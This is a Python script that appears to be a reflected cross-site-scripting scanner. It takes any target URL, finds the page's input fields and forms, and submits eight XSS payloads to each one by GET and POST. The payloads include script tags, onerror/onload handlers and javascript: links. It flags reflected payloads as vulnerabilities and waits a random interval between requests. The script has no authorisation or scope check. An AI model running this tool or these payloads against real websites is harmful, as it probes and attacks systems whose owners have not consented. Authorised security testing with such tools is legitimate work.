import requests
from bs4 import BeautifulSoup
import re
import html
import urllib.parse
import time
import random

xss_payloads = [
    '<script>alert("XSS1")</script>',
    '"><script>alert("XSS2")</script>',
    '<img src=x onerror=alert("XSS3")>',
    '<svg onload=alert("XSS4")>',
    '"><svg/onload=alert("XSS5")>',
    '"><iframe/src=javascript:alert("XSS6")>',
    '"><body/onload=alert("XSS7")>',
    '"><a href="javascript:alert(\'XSS8\')">Click me</a>',
]


def get_page_content(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None


def find_input_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    input_fields = soup.find_all(['input', 'textarea'])
    forms = soup.find_all('form')
    return input_fields, forms


def test_xss(url, input_fields, forms, payloads):
    for payload in payloads:
        for input_field in input_fields:
            input_name = input_field.get('name')
            if input_name:
                # Try injecting payload into each input
                injected_url = f"{url}?{input_name}={urllib.parse.quote(payload)}"
                print(f"Testing URL: {injected_url}")
                response = requests.get(injected_url)
                check_vulnerability(response, payload)

        # Handling form submissions
        for form in forms:
            form_action = form.get('action')
            if form_action:
                form_method = form.get('method', 'get').lower()
                form_data = {}

                # Populate form data with payloads
                for input_field in form.find_all(['input', 'textarea']):
                    input_name = input_field.get('name')
                    if input_name:
                        form_data[input_name] = payload

                full_url = urllib.parse.urljoin(url, form_action)

                if form_method == 'post':
                    print(f"Submitting form to {full_url} with POST method.")
                    response = requests.post(full_url, data=form_data)
                else:
                    print(f"Submitting form to {full_url} with GET method.")
                    response = requests.get(full_url, params=form_data)

                check_vulnerability(response, payload)

        time.sleep(random.uniform(0.5, 3.0))


def check_vulnerability(response, payload):
    if payload in response.text:
        print(f"Potential XSS vulnerability found with payload: {html.escape(payload)}")
    else:
        print("No vulnerability found with this payload.")


if __name__ == "__main__":
    target_url = input("Enter the target URL: ")

    page_content = get_page_content(target_url)
    if page_content:
        input_fields, forms = find_input_fields(page_content)
        print(f"Found {len(input_fields)} input fields and {len(forms)} forms on {target_url}")
        test_xss(target_url, input_fields, forms, xss_payloads)
    else:
        print("Failed to retrieve the webpage content.")
